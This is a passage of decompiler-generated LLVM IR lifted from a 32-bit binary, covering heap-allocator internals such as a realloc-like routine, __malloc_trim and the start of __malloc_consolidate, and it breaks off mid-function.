  %v2_805315c = inttoptr i32 %v1_805315c to i32*
  %v3_805315c = load i32, i32* %v2_805315c, align 4
  store i32 %v3_805315c, i32* %eax.global-to-local, align 4
  %v1_805315f = load i32, i32* @edx, align 4
  %v2_805315f = add i32 %v1_805315f, 28
  %v3_805315f = inttoptr i32 %v2_805315f to i32*
  store i32 %v3_805315c, i32* %v3_805315f, align 4
  %v0_8053162 = load i32, i32* @esi, align 4
  %v1_8053162 = add i32 %v0_8053162, 32
  %v2_8053162 = inttoptr i32 %v1_8053162 to i32*
  %v3_8053162 = load i32, i32* %v2_8053162, align 4
  store i32 %v3_8053162, i32* %eax.global-to-local, align 4
  %v1_8053165 = load i32, i32* @edx, align 4
  %v2_8053165 = add i32 %v1_8053165, 32
  %v3_8053165 = inttoptr i32 %v2_8053165 to i32*
  store i32 %v3_8053162, i32* %v3_8053165, align 4
  br label %dec_label_pc_8053168

dec_label_pc_8053168:                             ; preds = %dec_label_pc_805314b, %dec_label_pc_805313a, %dec_label_pc_8053121, %dec_label_pc_8053110, %dec_label_pc_805315c
  %v0_805316b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805316b = add i32 %v0_805316b, 8
  store i32 %v1_805316b, i32* @ebx, align 4
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_8053172 = call i32 @free(i32 %tmp8)
  br label %dec_label_pc_80532a6

dec_label_pc_805317c:                             ; preds = %dec_label_pc_805303d, %dec_label_pc_80530f3, %dec_label_pc_80530c1
  %v1_805318d = phi i32 [ %v1_805302d, %dec_label_pc_805303d ], [ %v2_80530fa, %dec_label_pc_80530f3 ], [ %v0_805317c.pre, %dec_label_pc_80530c1 ]
  %v5_805317e = sub i32 %v1_805318d, %stack_var_-40.0
  store i32 %v5_805317e, i32* %ecx.global-to-local, align 4
  %tmp27 = icmp ult i32 %v5_805317e, 16
  br i1 %tmp27, label %dec_label_pc_8053187, label %dec_label_pc_8053199

dec_label_pc_8053187:                             ; preds = %dec_label_pc_805317c
  %v0_8053187 = load i32, i32* @edi, align 4
  %v1_8053187 = add i32 %v0_8053187, 4
  %v2_8053187 = inttoptr i32 %v1_8053187 to i32*
  %v3_8053187 = load i32, i32* %v2_8053187, align 4
  %v1_805318a = urem i32 %v3_8053187, 2
  %v2_805318d = or i32 %v1_805318a, %v1_805318d
  store i32 %v2_805318d, i32* %eax.global-to-local, align 4
  store i32 %v2_805318d, i32* %v2_8053187, align 4
  %v0_8053192 = load i32, i32* @edi, align 4
  %v1_8053192 = load i32, i32* @ebx, align 4
  %v2_8053192 = add i32 %v0_8053192, 4
  %v3_8053192 = add i32 %v2_8053192, %v1_8053192
  %v4_8053192 = inttoptr i32 %v3_8053192 to i32*
  %v5_8053192 = load i32, i32* %v4_8053192, align 4
  %v6_8053192 = or i32 %v5_8053192, 1
  store i32 %v6_8053192, i32* %v4_8053192, align 4
  br label %dec_label_pc_80531c9

dec_label_pc_8053199:                             ; preds = %dec_label_pc_805317c
  %v0_805319d = load i32, i32* @edi, align 4
  %v2_805319d = add i32 %v0_805319d, %stack_var_-40.0
  store i32 %v2_805319d, i32* %eax.global-to-local, align 4
  %v1_80531a0 = add i32 %v0_805319d, 4
  %v2_80531a0 = inttoptr i32 %v1_80531a0 to i32*
  %v3_80531a0 = load i32, i32* %v2_80531a0, align 4
  %v1_80531a3 = urem i32 %v3_80531a0, 2
  %v5_80531a6 = or i32 %v1_80531a3, %stack_var_-40.0
  store i32 %v5_80531a6, i32* %v2_80531a0, align 4
  %v0_80531b0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80531b2 = or i32 %v0_80531b0, 1
  store i32 %v1_80531b2, i32* @edx, align 4
  %v1_80531b5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80531b5 = add i32 %v1_80531b5, 4
  %v3_80531b5 = inttoptr i32 %v2_80531b5 to i32*
  store i32 %v1_80531b2, i32* %v3_80531b5, align 4
  %v0_80531b8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80531b8 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80531b8 = add i32 %v0_80531b8, 4
  %v3_80531b8 = add i32 %v2_80531b8, %v1_80531b8
  %v4_80531b8 = inttoptr i32 %v3_80531b8 to i32*
  %v5_80531b8 = load i32, i32* %v4_80531b8, align 4
  %v6_80531b8 = or i32 %v5_80531b8, 1
  store i32 %v6_80531b8, i32* %v4_80531b8, align 4
  %v0_80531bd = load i32, i32* %eax.global-to-local, align 4
  %v1_80531bd = add i32 %v0_80531bd, 8
  store i32 %v1_80531bd, i32* %eax.global-to-local, align 4
  store i32 %v1_80531bd, i32* %stack_var_-60, align 4
  %v1_80531c1 = call i32 @free(i32 %v1_80531bd)
  store i32 %v1_80531c1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80531c9

dec_label_pc_80531c9:                             ; preds = %dec_label_pc_8053187, %dec_label_pc_8053199
  %v0_80531c9 = load i32, i32* @edi, align 4
  %v1_80531c9 = add i32 %v0_80531c9, 8
  store i32 %v1_80531c9, i32* @ebx, align 4
  br label %dec_label_pc_80532b3

dec_label_pc_80531d1:                             ; preds = %dec_label_pc_8053021
  store i32 %tmp8, i32* %ecx.global-to-local, align 4
  %v0_80531d5 = load i32, i32* @global_var_8068bfc.737, align 4
  store i32 %v0_80531d5, i32* %eax.global-to-local, align 4
  %v2_80531de = inttoptr i32 %v1_8053025 to i32*
  %v3_80531de = load i32, i32* %v2_80531de, align 4
  store i32 %v3_80531de, i32* @ebp, align 4
  %v1_80531e1 = add i32 %v0_80531d5, -1
  %v1_80531e2 = or i32 %stack_var_-40.0, 4
  store i32 %v1_80531e2, i32* %stack_var_-44, align 4
  %v2_80531e8 = add i32 %v1_80531e1, %v3_80531de
  store i32 %v2_80531e8, i32* @edx, align 4
  %v1_80531eb = sub i32 0, %v0_80531d5
  store i32 %v1_80531eb, i32* %eax.global-to-local, align 4
  %v2_80531ed = add i32 %v2_80531e8, %v1_80531e2
  %v2_80531f0 = and i32 %v2_80531ed, %v1_80531eb
  store i32 %v2_80531f0, i32* @esi, align 4
  %v2_80531f4 = sub i32 %v2_80531f0, %v3_80531de
  store i32 %v2_80531f4, i32* @ebx, align 4
  %v15_80531f6 = icmp eq i32 %v1_805302d, %v2_80531f4
  br i1 %v15_80531f6, label %dec_label_pc_80532af, label %dec_label_pc_8053200

dec_label_pc_8053200:                             ; preds = %dec_label_pc_80531d1
  %v2_8053202 = sub i32 %v1_8053025, %v3_80531de
  store i32 %v2_8053202, i32* @edi, align 4
  %v2_8053209 = add i32 %v3_80531de, %v1_805302d
  store i32 %v2_8053209, i32* %eax.global-to-local, align 4
  store i32 %v2_8053202, i32* %stack_var_-60, align 4
  %v6_805320d = call i32 @mremap(i32 %v2_8053202, i32 %v2_8053209, i32 %v2_80531f0, i32 1, i32 %v1_80531e2, i32 %v1_805302d)
  store i32 %v6_805320d, i32* %eax.global-to-local, align 4
  %v10_8053215 = icmp eq i32 %v6_805320d, -1
  br i1 %v10_8053215, label %dec_label_pc_8053267, label %dec_label_pc_805321a

dec_label_pc_805321a:                             ; preds = %dec_label_pc_8053200
  %v1_805321a = load i32, i32* @ebp, align 4
  %v2_805321a = add i32 %v1_805321a, %v6_805320d
  store i32 %v2_805321a, i32* %eax.global-to-local, align 4
  %v0_805321c = load i32, i32* @ebx, align 4
  %v1_805321c = or i32 %v0_805321c, 2
  %v2_805321f = add i32 %v2_805321a, 4
  %v3_805321f = inttoptr i32 %v2_805321f to i32*
  store i32 %v1_805321c, i32* %v3_805321f, align 4
  %v0_8053222 = load i32, i32* @esi, align 4
  %v5_8053224 = sub i32 %v0_8053222, %v1_805302d
  %v0_8053228 = load i32, i32* @global_var_8068c10.741, align 16
  %v0_805322e = load i32, i32* %eax.global-to-local, align 4
  %v1_805322e = add i32 %v0_805322e, 8
  store i32 %v1_805322e, i32* @ebx, align 4
  %v1_8053231 = load i32, i32* @global_var_8068c04.743, align 4
  %v2_8053231 = add i32 %v1_8053231, %v5_8053224
  store i32 %v2_8053231, i32* @global_var_8068c04.743, align 4
  %tmp20 = icmp ule i32 %v2_8053231, %v0_8053228
  %v5_8053243 = select i1 %tmp20, i32 %v0_8053228, i32 %v2_8053231
  store i32 %v5_8053243, i32* %ecx.global-to-local, align 4
  %v1_8053246 = load i32, i32* @global_var_8068c08.744, align 8
  %v2_8053246 = add i32 %v1_8053246, %v2_8053231
  store i32 %v5_8053243, i32* @global_var_8068c10.741, align 16
  %v1_8053252 = load i32, i32* @global_var_8068c14.745, align 4
  %tmp28 = icmp ule i32 %v2_8053246, %v1_8053252
  %v5_8053258 = select i1 %tmp28, i32 %v1_8053252, i32 %v2_8053246
  store i32 %v5_8053258, i32* @edx, align 4
  store i32 %v5_8053258, i32* @global_var_8068c14.745, align 4
  br label %dec_label_pc_80532b3

dec_label_pc_8053267:                             ; preds = %dec_label_pc_8053200
  %v2_8053267 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_8053267, i32* %eax.global-to-local, align 4
  %v10_805326a = icmp ult i32 %v1_805302d, %v2_8053267
  %v1_805326e = icmp eq i1 %v10_805326a, false
  br i1 %v1_805326e, label %dec_label_pc_80532af, label %dec_label_pc_8053270

dec_label_pc_8053270:                             ; preds = %dec_label_pc_8053267
  %v1_8053277 = add i32 %stack_var_-40.0, -7
  store i32 %v1_8053277, i32* %eax.global-to-local, align 4
  store i32 %v1_8053277, i32* %stack_var_-60, align 4
  %v1_805327b = call i32 @malloc(i32 %v1_8053277)
  store i32 %v1_805327b, i32* %eax.global-to-local, align 4
  %v1_8053283 = icmp eq i32 %v1_805327b, 0
  store i32 %v1_805327b, i32* @ebx, align 4
  br i1 %v1_8053283, label %dec_label_pc_80532ab, label %dec_label_pc_8053289

dec_label_pc_8053289:                             ; preds = %dec_label_pc_8053270
  %v1_805328e = add i32 %v1_805302d, -8
  store i32 %v1_805328e, i32* %eax.global-to-local, align 4
  store i32 %v1_805327b, i32* %stack_var_-60, align 4
  %v3_8053297 = inttoptr i32 %v1_805327b to i16*
  %v4_8053297 = call i32 @memcpy(i16* %v3_8053297, i32 %tmp8, i32 %v1_805328e)
  store i32 %v4_8053297, i32* %eax.global-to-local, align 4
  store i32 %v1_805327b, i32* @edx, align 4
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_80532a1 = call i32 @free(i32 %tmp8)
  br label %dec_label_pc_80532a6

dec_label_pc_80532a6:                             ; preds = %dec_label_pc_8053168, %dec_label_pc_8053289
  %storemerge = phi i32 [ %v1_80532a1, %dec_label_pc_8053289 ], [ %v1_8053172, %dec_label_pc_8053168 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80532b3

dec_label_pc_80532ab:                             ; preds = %dec_label_pc_8053270, %dec_label_pc_80530cc
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80532b3

dec_label_pc_80532af:                             ; preds = %dec_label_pc_8053267, %dec_label_pc_80531d1, %dec_label_pc_805306b
  store i32 %tmp8, i32* @ebx, align 4
  br label %dec_label_pc_80532b3

dec_label_pc_80532b3:                             ; preds = %dec_label_pc_80532ab, %dec_label_pc_80532a6, %dec_label_pc_805321a, %dec_label_pc_80531c9, %dec_label_pc_80532af
  store i32 %v2_8052fda, i32* @eax, align 4
  store i32 %v2_8052fda, i32* %stack_var_-60, align 4
  %v2_80532bc = call i32 @__pthread_return_void(i32 %v2_8052fda, i32 1)
  store i32 %v2_80532bc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80532c1

dec_label_pc_80532c1:                             ; preds = %dec_label_pc_8052fbe, %dec_label_pc_8052faa, %dec_label_pc_80532b3
  br label %dec_label_pc_80532c4

dec_label_pc_80532c4:                             ; preds = %dec_label_pc_8052ff8, %dec_label_pc_80532c1
  %v0_80532c7 = load i32, i32* @ebx, align 4
  store i32 %v0_80532c7, i32* %eax.global-to-local, align 4
  store i32 %v0_8052f9b, i32* %ebx.global-to-local, align 4
  store i32 %v0_8052f9a, i32* @esi, align 4
  ret i32 %v0_80532c7

; uselistorder directives
  uselistorder i32 %v1_805327b, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v1_8053252, { 1, 0 }
  uselistorder i32 %v2_8053246, { 1, 0 }
  uselistorder i32 %v2_8053231, { 0, 3, 1, 2 }
  uselistorder i32 %v0_8053228, { 1, 0 }
  uselistorder i32 %v6_805320d, { 1, 0, 2 }
  uselistorder i32 %v2_8053202, { 1, 0, 2 }
  uselistorder i32 %v1_80531e2, { 2, 0, 1 }
  uselistorder i32 %v3_80531de, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_805319d, { 1, 0 }
  uselistorder i32 %v1_8053103, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_80530d7, { 1, 3, 2, 0, 4, 5, 6, 7 }
  uselistorder i32 %v2_805307b, { 1, 0, 2 }
  uselistorder i32 %v3_805308e, { 0, 2, 1 }
  uselistorder i32 %v2_805304b, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_805302d, { 12, 11, 13, 10, 1, 0, 7, 15, 2, 14, 3, 4, 5, 6, 9, 8, 16 }
  uselistorder i32 %v1_8053025, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 12, 4, 0, 1, 9, 8, 7, 2, 5, 3, 6, 11, 10 }
  uselistorder i32 %v1_805301a, { 1, 0 }
  uselistorder i32 %v1_805300a, { 1, 2, 0 }
  uselistorder i32 %v0_8052ff3, { 1, 0 }
  uselistorder i32 %v2_8052fda, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp8, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 39, 37, 40, 41, 42, 43, 0, 44, 45, 46, 47, 48 }
  uselistorder i32 %arg2, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_80532c4, { 1, 0 }
  uselistorder label %dec_label_pc_80532c1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80532b3, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80532a6, { 1, 0 }
  uselistorder label %dec_label_pc_80531c9, { 1, 0 }
  uselistorder label %dec_label_pc_805317c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8053168, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80530c1, { 1, 0 }
  uselistorder label %dec_label_pc_8053021, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_80532d1 = load i32, i32* @edx, align 4
  store i32 %v0_80532d1, i32* %ebp.global-to-local, align 4
  %v0_80532d4 = load i32, i32* @esi, align 4
  %v1_80532d9 = add i32 %v0_80532d1, 860
  %v2_80532d9 = inttoptr i32 %v1_80532d9 to i32*
  %v3_80532d9 = load i32, i32* %v2_80532d9, align 4
  store i32 %v3_80532d9, i32* @ecx, align 4
  %v1_80532df = add i32 %v0_80532d1, 44
  %v2_80532df = inttoptr i32 %v1_80532df to i32*
  %v3_80532df = load i32, i32* %v2_80532df, align 4
  %v1_80532e2 = add i32 %v3_80532df, 4
  %v2_80532e2 = inttoptr i32 %v1_80532e2 to i32*
  %v3_80532e2 = load i32, i32* %v2_80532e2, align 4
  %v1_80532e5 = and i32 %v3_80532e2, -4
  store i32 %v1_80532e5, i32* @esi, align 4
  %v1_80532ea = load i32, i32* @eax, align 4
  %v2_80532ea = add i32 %v3_80532d9, -17
  %v2_80532ec = add i32 %v2_80532ea, %v1_80532e5
  %v3_80532ec = sub i32 %v2_80532ec, %v1_80532ea
  %div = udiv i32 %v3_80532ec, %v3_80532d9
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_80532ec, %v3_80532d9
  store i32 %tmp10, i32* @edx, align 4
  %v1_80532f4 = add i32 %div, -1
  %v4_80532f7 = mul i32 %v1_80532f4, %v3_80532d9
  store i32 %v4_80532f7, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_80532f7, 1
  br i1 %tmp11, label %dec_label_pc_8053353, label %dec_label_pc_80532fe

dec_label_pc_80532fe:                             ; preds = %entry
  %v1_8053303 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8053303, i32* %edi.global-to-local, align 4
  %v0_805330d = load i32, i32* @esi, align 4
  store i32 %v0_805330d, i32* %eax.global-to-local, align 4
  %v1_805330f = load i32, i32* %ebp.global-to-local, align 4
  %v2_805330f = add i32 %v1_805330f, 44
  %v3_805330f = inttoptr i32 %v2_805330f to i32*
  %v4_805330f = load i32, i32* %v3_805330f, align 4
  %v5_805330f = add i32 %v4_805330f, %v0_805330d
  store i32 %v5_805330f, i32* %eax.global-to-local, align 4
  %v12_8053312 = icmp eq i32 %v1_8053303, %v5_805330f
  %v1_8053314 = icmp eq i1 %v12_8053312, false
  br i1 %v1_8053314, label %dec_label_pc_8053353, label %dec_label_pc_8053316

dec_label_pc_8053316:                             ; preds = %dec_label_pc_80532fe
  %v1_8053319 = sub i32 0, %v4_80532f7
  store i32 %v1_8053319, i32* @ebx, align 4
  %v1_805331c = call i32 @__GI_sbrk(i32 %v1_8053319)
  store i32 %v1_805331c, i32* %eax.global-to-local, align 4
  %v1_8053328 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8053328, i32* %eax.global-to-local, align 4
  %v10_8053330 = icmp eq i32 %v1_8053328, -1
  br i1 %v10_8053330, label %dec_label_pc_8053353, label %dec_label_pc_8053335

dec_label_pc_8053335:                             ; preds = %dec_label_pc_8053316
  %v0_8053335 = load i32, i32* %edi.global-to-local, align 4
  %v2_8053337 = sub i32 %v0_8053335, %v1_8053328
  %v12_8053337 = icmp eq i32 %v2_8053337, 0
  store i32 %v2_8053337, i32* @ecx, align 4
  br i1 %v12_8053337, label %dec_label_pc_8053353, label %dec_label_pc_805333b

dec_label_pc_805333b:                             ; preds = %dec_label_pc_8053335
  %v0_805333b = load i32, i32* %ebp.global-to-local, align 4
  %v1_805333b = add i32 %v0_805333b, 44
  %v2_805333b = inttoptr i32 %v1_805333b to i32*
  %v3_805333b = load i32, i32* %v2_805333b, align 4
  store i32 %v3_805333b, i32* %eax.global-to-local, align 4
  %v0_805333e = load i32, i32* @esi, align 4
  %v2_805333e = sub i32 %v0_805333e, %v2_8053337
  store i32 %v2_805333e, i32* %esi.global-to-local, align 4
  %v1_8053340 = add i32 %v0_805333b, 872
  %v2_8053340 = inttoptr i32 %v1_8053340 to i32*
  %v3_8053340 = load i32, i32* %v2_8053340, align 4
  %v5_8053340 = sub i32 %v3_8053340, %v2_8053337
  store i32 %v5_8053340, i32* %v2_8053340, align 4
  %v0_8053346 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053346 = or i32 %v0_8053346, 1
  store i32 %v1_8053346, i32* %esi.global-to-local, align 4
  %v1_8053349 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053349 = add i32 %v1_8053349, 4
  %v3_8053349 = inttoptr i32 %v2_8053349 to i32*
  store i32 %v1_8053346, i32* %v3_8053349, align 4
  br label %dec_label_pc_8053355

dec_label_pc_8053353:                             ; preds = %dec_label_pc_8053335, %dec_label_pc_8053316, %dec_label_pc_80532fe, %entry
  br label %dec_label_pc_8053355

dec_label_pc_8053355:                             ; preds = %dec_label_pc_805333b, %dec_label_pc_8053353
  %storemerge = phi i32 [ 1, %dec_label_pc_805333b ], [ 0, %dec_label_pc_8053353 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_80532d4, i32* %esi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8053328, { 1, 0, 2 }
  uselistorder i32 %v4_80532f7, { 1, 2, 0 }
  uselistorder i32 %v3_80532d9, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_80532d1, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 4, 0, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8053355, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_805335e = load i32, i32* @edi, align 4
  %v0_805335f = load i32, i32* @esi, align 4
  %v0_8053360 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_8053368 = load i32, i32* %arg1, align 4
  store i32 %v2_8053368, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_805336f = icmp eq i32 %v2_8053368, 0
  br i1 %v1_805336f, label %dec_label_pc_8053498.preheader, label %dec_label_pc_8053377

dec_label_pc_8053498.preheader:                   ; preds = %entry
  %v3_805348d = add i32 %tmp11, 44
  br label %dec_label_pc_8053489

dec_label_pc_8053377:                             ; preds = %entry
  %v1_805337b = and i32 %v2_8053368, -3
  store i32 %v1_805337b, i32* %arg1, align 4
  %v1_8053380 = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_805338f = add i32 %tmp11, 4
  store i32 %v1_805338f, i32* %eax.global-to-local, align 4
  %v2_8053396 = load i32, i32* %arg1, align 4
  %v2_805339c = udiv i32 %v2_8053396, 8
  %v2_805339f = mul nuw i32 %v2_805339c, 4
  %v3_805339f = add i32 %tmp11, -4
  %v4_805339f = add i32 %v3_805339f, %v2_805339f
  store i32 %v4_805339f, i32* %eax.global-to-local, align 4
  %v2_8053466 = add i32 %tmp11, 44
  %v3_8053466 = inttoptr i32 %v2_8053466 to i32*
  %v1_8053439 = add i32 %tmp11, 60
  %v2_8053439 = inttoptr i32 %v1_8053439 to i32*
  br label %dec_label_pc_80533a7

dec_label_pc_80533a7:                             ; preds = %dec_label_pc_805347f, %dec_label_pc_8053377
  %v0_80533b5 = phi i32 [ %v1_805338f, %dec_label_pc_8053377 ], [ %v4_805347f, %dec_label_pc_805347f ]
  store i32 %v0_80533b5, i32* %eax.global-to-local, align 4
  %v1_80533ab = inttoptr i32 %v0_80533b5 to i32*
  %v2_80533ab = load i32, i32* %v1_80533ab, align 4
  store i32 %v2_80533ab, i32* @ecx, align 4
  %v1_80533ad = icmp eq i32 %v2_80533ab, 0
  br i1 %v1_80533ad, label %dec_label_pc_8053475, label %dec_label_pc_80533b5

dec_label_pc_80533b5:                             ; preds = %dec_label_pc_80533a7
  store i32 0, i32* %v1_80533ab, align 4
  %v0_80533bb.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80533bb

dec_label_pc_80533bb:                             ; preds = %dec_label_pc_8053469, %dec_label_pc_80533b5
  %v0_80533d8 = phi i32 [ %v3_80533bb, %dec_label_pc_8053469 ], [ %v0_80533bb.pre, %dec_label_pc_80533b5 ]
  %v1_80533bb = add i32 %v0_80533d8, 8
  %v2_80533bb = inttoptr i32 %v1_80533bb to i32*
  %v3_80533bb = load i32, i32* %v2_80533bb, align 4
  store i32 %v3_80533bb, i32* %edx.global-to-local, align 4
  %v1_80533c2 = add i32 %v0_80533d8, 4
  %v2_80533c2 = inttoptr i32 %v1_80533c2 to i32*
  %v3_80533c2 = load i32, i32* %v2_80533c2, align 4
  store i32 %v3_80533c2, i32* %eax.global-to-local, align 4
  %v1_80533c7 = and i32 %v3_80533c2, -2
  store i32 %v1_80533c7, i32* @edi, align 4
  %v2_80533ca = urem i32 %v3_80533c2, 2
  %v3_80533ca = icmp eq i32 %v2_80533ca, 0
  %v2_80533cc = add i32 %v1_80533c7, %v0_80533d8
  store i32 %v2_80533cc, i32* @ebx, align 4
  %v1_80533cf = add i32 %v2_80533cc, 4
  %v2_80533cf = inttoptr i32 %v1_80533cf to i32*
  %v3_80533cf = load i32, i32* %v2_80533cf, align 4
  store i32 %v3_80533cf, i32* %edx.global-to-local, align 4
  %v1_80533d6 = icmp eq i1 %v3_80533ca, false
  br i1 %v1_80533d6, label %dec_label_pc_80533f8, label %dec_label_pc_80533d8

dec_label_pc_80533d8:                             ; preds = %dec_label_pc_80533bb
  %v1_80533d8 = inttoptr i32 %v0_80533d8 to i32*
  %v2_80533d8 = load i32, i32* %v1_80533d8, align 4
  store i32 %v2_80533d8, i32* %ebp.global-to-local, align 4
  %v2_80533dc = sub i32 %v0_80533d8, %v2_80533d8
  store i32 %v2_80533dc, i32* %eax.global-to-local, align 4
  %v1_80533de = add i32 %v2_80533dc, 8
  %v2_80533de = inttoptr i32 %v1_80533de to i32*
  %v3_80533de = load i32, i32* %v2_80533de, align 4
  store i32 %v3_80533de, i32* @esi, align 4
  %v1_80533e1 = add i32 %v2_80533dc, 12
  %v2_80533e1 = inttoptr i32 %v1_80533e1 to i32*
  %v3_80533e1 = load i32, i32* %v2_80533e1, align 4
  store i32 %v3_80533e1, i32* %edx.global-to-local, align 4
  %v1_80533e4 = add i32 %v3_80533de, 12
  %v2_80533e4 = inttoptr i32 %v1_80533e4 to i32*
  %v3_80533e4 = load i32, i32* %v2_80533e4, align 4
  store i32 %v3_80533e4, i32* @ecx, align 4
  %v12_80533e7 = icmp eq i32 %v3_80533e4, %v2_80533dc
  %v1_80533e9 = icmp eq i1 %v12_80533e7, false
  br i1 %v1_80533e9, label %dec_label_pc_8053428, label %dec_label_pc_80533eb

dec_label_pc_80533eb:                             ; preds = %dec_label_pc_80533d8
  %v1_80533eb = add i32 %v3_80533e1, 8
  %v2_80533eb = inttoptr i32 %v1_80533eb to i32*
  %v3_80533eb = load i32, i32* %v2_80533eb, align 4
  %v15_80533eb = icmp eq i32 %v3_80533eb, %v3_80533e4
  %v1_80533ee = icmp eq i1 %v15_80533eb, false
  br i1 %v1_80533ee, label %dec_label_pc_8053428, label %dec_label_pc_80533f0

dec_label_pc_80533f0:                             ; preds = %dec_label_pc_80533eb
  %v2_80533f0 = add i32 %v2_80533d8, %v1_80533c7
  store i32 %v2_80533f0, i32* @edi, align 4
  store i32 %v3_80533e1, i32* %v2_80533e4, align 4
  %v0_80533f5 = load i32, i32* @esi, align 4
  %v1_80533f5 = load i32, i32* %edx.global-to-local, align 4
  %v2_80533f5 = add i32 %v1_80533f5, 8
  %v3_80533f5 = inttoptr i32 %v2_80533f5 to i32*
  store i32 %v0_80533f5, i32* %v3_80533f5, align 4
  %v0_8053403.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80533f8

dec_label_pc_80533f8:                             ; preds = %dec_label_pc_80533bb, %dec_label_pc_80533f0
  %v1_805340c = phi i32 [ %v2_80533cc, %dec_label_pc_80533bb ], [ %v0_8053403.pre, %dec_label_pc_80533f0 ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8053400 = and i32 %v3_80533cf, -4
  store i32 %v1_8053400, i32* %ebp.global-to-local, align 4
  %v4_8053403 = load i32, i32* %v3_8053466, align 4
  %v15_8053403 = icmp eq i32 %v1_805340c, %v4_8053403
  br i1 %v15_8053403, label %dec_label_pc_8053459, label %dec_label_pc_8053408

dec_label_pc_8053408:                             ; preds = %dec_label_pc_80533f8
  %v2_8053408 = add i32 %v1_805340c, 4
  %v3_8053408 = add i32 %v2_8053408, %v1_8053400
  %v4_8053408 = inttoptr i32 %v3_8053408 to i32*
  %v5_8053408 = load i32, i32* %v4_8053408, align 4
  store i32 %v5_8053408, i32* %eax.global-to-local, align 4
  %v3_805340c = inttoptr i32 %v2_8053408 to i32*
  store i32 %v1_8053400, i32* %v3_805340c, align 4
  %v0_805340f = load i32, i32* %eax.global-to-local, align 4
  %v1_805340f = urem i32 %v0_805340f, 2
  %v2_805340f = icmp eq i32 %v1_805340f, 0
  store i32 %v1_805340f, i32* %eax.global-to-local, align 4
  %v1_8053414 = icmp eq i1 %v2_805340f, false
  br i1 %v1_8053414, label %dec_label_pc_8053435, label %dec_label_pc_8053416

dec_label_pc_8053416:                             ; preds = %dec_label_pc_8053408
  %v0_8053416 = load i32, i32* @ebx, align 4
  %v1_8053416 = add i32 %v0_8053416, 8
  %v2_8053416 = inttoptr i32 %v1_8053416 to i32*
  %v3_8053416 = load i32, i32* %v2_8053416, align 4
  store i32 %v3_8053416, i32* @edx, align 4
  %v1_8053419 = add i32 %v0_8053416, 12
  %v2_8053419 = inttoptr i32 %v1_8053419 to i32*
  %v3_8053419 = load i32, i32* %v2_8053419, align 4
  store i32 %v3_8053419, i32* %eax.global-to-local, align 4
  %v1_805341c = add i32 %v3_8053416, 12
  %v2_805341c = inttoptr i32 %v1_805341c to i32*
  %v3_805341c = load i32, i32* %v2_805341c, align 4
  store i32 %v3_805341c, i32* @esi, align 4
  %v12_805341f = icmp eq i32 %v3_805341c, %v0_8053416
  %v1_8053421 = icmp eq i1 %v12_805341f, false
  br i1 %v1_8053421, label %dec_label_pc_8053428, label %dec_label_pc_8053423

dec_label_pc_8053423:                             ; preds = %dec_label_pc_8053416
  %v1_8053423 = add i32 %v3_8053419, 8
  %v2_8053423 = inttoptr i32 %v1_8053423 to i32*
  %v3_8053423 = load i32, i32* %v2_8053423, align 4
  %v15_8053423 = icmp eq i32 %v3_8053423, %v3_805341c
  br i1 %v15_8053423, label %dec_label_pc_805342d, label %dec_label_pc_8053428

